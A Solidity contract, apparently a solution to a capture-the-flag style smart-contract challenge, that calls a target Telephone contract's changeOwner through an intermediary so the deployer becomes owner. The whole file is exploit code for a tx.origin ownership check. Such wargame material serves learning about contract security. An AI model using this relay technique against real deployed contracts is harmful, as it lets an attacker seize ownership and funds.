// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneAttack {
    Telephone private telephone;
    address private attacker;

    constructor(Telephone _telephone) {
        telephone = _telephone;
        attacker = msg.sender;
    }

    function attack() public {
        telephone.changeOwner(attacker);
    }
}
